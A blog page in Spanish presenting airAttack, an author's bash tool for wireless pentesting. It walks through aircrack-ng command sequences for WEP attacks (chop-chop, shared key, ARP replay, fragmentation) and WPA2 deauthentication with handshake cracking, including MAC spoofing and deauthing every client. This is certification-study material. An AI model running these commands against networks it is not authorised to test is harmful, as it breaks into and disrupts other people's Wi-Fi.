@@ -1,0 +1,529 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>airAttack - EricLabrador.io</title>
+<meta name="description" content="En este artículo, explico la utilidad de la herramienta airAttack. También dejo reflejado cada ataque, la finalidad de cada ataque y como ejecutarlo. Todos los ataques de esta herramienta se ejecutan gracias a la suite aircrack-ng. La herramienta fue publicada en github el día 27/06/2021, pocos días después de aprobar el OSWPcomo primera release.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="EricLabrador.io">
+<meta property="og:title" content="airAttack">
+<meta property="og:url" content="http://localhost:4000/airAttack/">
+
+
+  <meta property="og:description" content="En este artículo, explico la utilidad de la herramienta airAttack. También dejo reflejado cada ataque, la finalidad de cada ataque y como ejecutarlo. Todos los ataques de esta herramienta se ejecutan gracias a la suite aircrack-ng. La herramienta fue publicada en github el día 27/06/2021, pocos días después de aprobar el OSWPcomo primera release.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/airAttack/airAttack.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-08-31T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/airAttack/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Eric Labrador",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="EricLabrador.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">airAttack</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/EricLogo.jpg" alt="Eric Labrador" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Eric Labrador</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        CyberSecurity Analyst / OSWP / eJPT
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Barcelona</span>
+        </li>
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:e.l.s.3334@gmail.com">
+            <meta itemprop="email" content="e.l.s.3334@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/https://www.linkedin.com/in/eric-labrador-sainz-23b4b4187/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/EricLabrador" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="airAttack">
+    <meta itemprop="description" content="En este artículo, explico la utilidad de la herramienta airAttack. También dejo reflejado cada ataque, la finalidad de cada ataque y como ejecutarlo. Todos los ataques de esta herramienta se ejecutan gracias a la suite aircrack-ng. La herramienta fue publicada en github el día 27/06/2021, pocos días después de aprobar el OSWPcomo primera release.">
+    <meta itemprop="datePublished" content="August 31, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">airAttack
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-08-31T00:00:00+02:00">August 31, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/airAttack/AIR-ATTACK-Header.jpg" alt="" /></p>
+
+<p><strong>airAttack</strong> es una herramienta ofensiva para automatizar los ataques a redes inalámbricas escrita en bash. Esta herramienta será mejorada por mi próximamente para para optimizar determiandas porciones de código. Los ataques de denegación de servicio así como nuevas funciones serán añadidas. Este programa lo escribí cuando estaba estudiando para el OSWP (Offensive Security Wireless Professional).</p>
+
+<p>En este artículo, explicaré cada ataque que puede utilizarse en airAttack, la finalidad de dicho ataque y como ejecutarlo.</p>
+
+<p>La herramienta se puede descargar en:</p>
+
+<ul>
+  <li><a href="https://github.com/EricLabrador/airAttack">https://github.com/EricLabrador/airAttack</a></li>
+</ul>
+
+<h2> Ataques WEP </h2>
+
+<p>Antes de empezar con los ataques WEP, es importante recalcar que todos estos ataques están enfocados obtener el máximo número de IVS para poder crackear la contraseña, a diferéncia de los ataques WPA2, cuya prioridad es obtener el hash de la red para poder posteriormente crackearlo.</p>
+
+<p><strong>IVS:</strong> Los IVS, también conocidos como “Archivos de Vector de inicialización”, se clasifican como archivos de datos que contienen vectores de  inicialización que son necesarios para la generación de los datos cifrados en la red.</p>
+
+<h3><u>Chop</u> <u>Chop</u> <u>Attack</u></h3>
+<p>El ataque de <strong>Chop Chop</strong> consiste en coger un byte de datos de un paquete encriptado WEP, substituyendo los valores de los bytes del paquete y recalculando la suma de verificación del encriptado. Los paquetes ya modificados se envían al router, el router simplemente los descarta hasta que el atacante finalmente logra sustituir una suma de verificación válida.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">-c</span> canal_de_ap <span class="nt">--bssid</span> mac_de_ap <span class="nt">-w</span> captura wlan0
+aireplay-ng <span class="nt">-1</span> 6000 <span class="nt">-o</span> 1 <span class="nt">-q</span> 10 <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_tarjeta wlan0
+aireplay-ng <span class="nt">-4</span> <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_tarjeta wlan0
+packetforge-ng <span class="nt">-0</span> <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_tarjeta <span class="nt">-l</span> 192.168.1.2 <span class="nt">-k</span> 192.168.1.255 <span class="nt">-y</span> <span class="k">*</span>.xor <span class="nt">-w</span> ataque_chopchop
+aireplay-ng <span class="nt">-2</span> <span class="nt">-r</span> ataque_chopchop wlan0
+aircrack-ng captura-01.cap
+</code></pre></div></div>
+
+<p><strong>Nota:</strong> Es importante dejar un pequeño espacio de tiempo entre comando y comando y esperar a que cada comando se inyecte correctamente en el router.</p>
+
+<h3><u>SKA</u></h3>
+<p>El ataque <strong>SKA</strong>, también conocido como “Broken Shared Key Authentication” consiste en copiar la dirección MAC de un cliente ya conectado a la red en nuestra própia tarjeta de red y generar un ataque de falsa autenticación con nuestra nueva MAC (MAC copiada del cliente previamente autenticado), el objetivo de autenticar nuestra MAC es generar paquetes ARP en la red.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">--bssid</span> mac_de_ap <span class="nt">-c</span> canal_de_ap wlan0 -&gt; Por ahora no es necesario empezar a capturar paquetes.
+</code></pre></div></div>
+<p>Cuando tenemos el punto de acceso localizado y la MAC localizada, dejaremos de ver el tráfico de la red con airodump y procederemos a cambiar la MAC de nuestra tarjeta de red, con el siguiente one-liner se puede cambiar.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig wlan0 down &amp;&gt; /dev/null <span class="o">&amp;&amp;</span> macchanger <span class="nt">--mac</span> mac_de_cliente wlan0 &amp;&gt; /dev/null <span class="o">&amp;&amp;</span> ifconfig wlan0 up &amp;&gt; /dev/null
+</code></pre></div></div>
+
+<p><strong>Nota</strong>: Puede que sea necesario ejecutar por segunda vez el one-liner para que se cambie correctamente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">-w</span> captura <span class="nt">--bssid</span> mac_de_ap <span class="nt">-c</span> canal_de_ap wlan0
+aireplay-ng <span class="nt">-3</span> <span class="nt">-b</span> mac_de_ap <span class="nt">-h</span> mac_tarjeta wlan0
+aireplay-ng <span class="nt">-0</span> 1 <span class="nt">-e</span> essid_de_ap <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_de_ap wlan0
+aircrack-ng captura-01.cap
+</code></pre></div></div>
+
+<h3><u>ARP</u> <u>Request</u> <u>Replay</u> <u>Attack</u></h3>
+
+<p>El ataque de <strong>ARP Request Replay Attack</strong> consiste en inyectar nuestra MAC en el router víctima, posteriormente se genera un ataque de denegación de servicio sobre uno de los clientes conectados (si este ataque se lanza contra todos, se obtendrán mas IVS, haciendo que la probabilidad de crackear la clave será más alta) y, cuando dichos clientes se vuelnvan a conectar a la red, se genererarán de forma automática paquetes ARP, lo que generará IVS.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">-w</span> captura <span class="nt">--bssid</span> mac_de_ap <span class="nt">-c</span> canal_de_ap wlan0
+aireplay-ng <span class="nt">-3</span> <span class="nt">-x</span> 1000 <span class="nt">-n</span> 1000 <span class="nt">-b</span> mac_de_ap <span class="nt">-h</span> mac_de_tarjeta wlan0
+aireplay-ng <span class="nt">-0</span> 5 <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_de_cliente_conectado wlan0
+aircrack-ng captura-01.cap
+</code></pre></div></div>
+
+<h3><u>Fragmentation</u> <u>Attack</u></h3>
+
+<p>Este ataque necesita que 1 único paquete de datos sea capturado por airodump. Posteriormente, se genera un nuevo paquete modificado con la dirección MAC de nuestra tarjeta de red y se inyecta el paquete modificado por el atacante en el punto de acceso objetivo. De esta forma, se generarán paquetes ARP y, en consecuéncia, los IVS necesários para crackear la clave.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">-w</span> captura <span class="nt">--bssid</span> mac_de_ap <span class="nt">-c</span> canal_de_ap wlan0
+aireplay-ng <span class="nt">-1</span> 6000 <span class="nt">-o</span> 1 <span class="nt">-q</span> 10 <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_tarjeta wlan0 -&gt; es muy recomendable dejar el cliente inyectado, ya que facilitará la obtención del paquete de datos.
+packetforge-ng <span class="nt">-0</span> <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_de_tarjeta <span class="nt">-l</span> 192.168.1.2 <span class="nt">-k</span> 192.168.1.255 <span class="nt">-y</span> <span class="k">*</span>.xor <span class="nt">-w</span> fragmentation_attack
+aireplay-ng <span class="nt">-2</span> <span class="nt">-r</span> fragmentation_attack wlan0
+aircrack-ng captura-01.cap
+</code></pre></div></div>
+
+<h2> Ataques WPA2 </h2>
+
+<p>El protocolo WPA2 hace años que empezó a monopolizarse en los routers instalados por las compañías telefónicas. Aun que si que es verdad que el protocolo WEP no se suele utilizar, aún hay routers que lo implementan, ya que hay dispositivos (si són de última generación suele no pasar) que únicamente aceptan el procolo WEP.</p>
+
+<p>El objetivo en estas redes es obtener un hash para poder crackearlo mediante el uso de un diccionario de contraseñas.</p>
+
+<h3><u>Ataque</u> <u>de</u> <u>deautenticación</u></h3>
+
+<p>El <strong>ataque de deautenticación</strong> ataque es un ataque de denegación de servicio, el objetivo es provocar que la víctima se reconecte al punto de acceso, en el momento que un dispositivo se conecta al router, se genera un packete handshake, el cual contiene la contraseña hasheada de la red inalámbrica.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">-c</span> canal_de_ap <span class="nt">--bssid</span> mac_de_ap <span class="nt">-w</span> captura wlan0
+aireplay-ng <span class="nt">-0</span> 15 <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_de_cliente wlan0 -&gt; se utiliza para deautenticar a un solo cliente de la red
+aireplay-ng <span class="nt">-0</span> 15 <span class="nt">-a</span> mac_de_ap <span class="nt">-c</span> FF:FF:FF:FF:FF:FF  wlan0 -&gt; se utiliza para deautenticar a todos los clientes de la red
+aircrack-ng <span class="nt">-J</span> miCaptura captura.cap
+hccap2john miCaptura.hccap <span class="o">&gt;</span> <span class="nb">hash
+</span>john <span class="nt">--wordlist</span><span class="o">=</span>rockyou.txt <span class="nb">hash</span>
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#aircrack-ng" class="page__taxonomy-item" rel="tag">aircrack-ng</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#shell" class="page__taxonomy-item" rel="tag">shell</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#wireless" class="page__taxonomy-item" rel="tag">wireless</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#wireless-pentesting" class="page__taxonomy-item" rel="tag">wireless_pentesting</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#script" class="page__taxonomy-item" rel="tag">script</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-08-31T00:00:00+02:00">August 31, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="#" class="pagination--pager disabled">Previous</a>
+    
+    
+      <a href="/mis_certificaciones/" class="pagination--pager" title="Mis Certificaciones
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 Eric Labrador</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
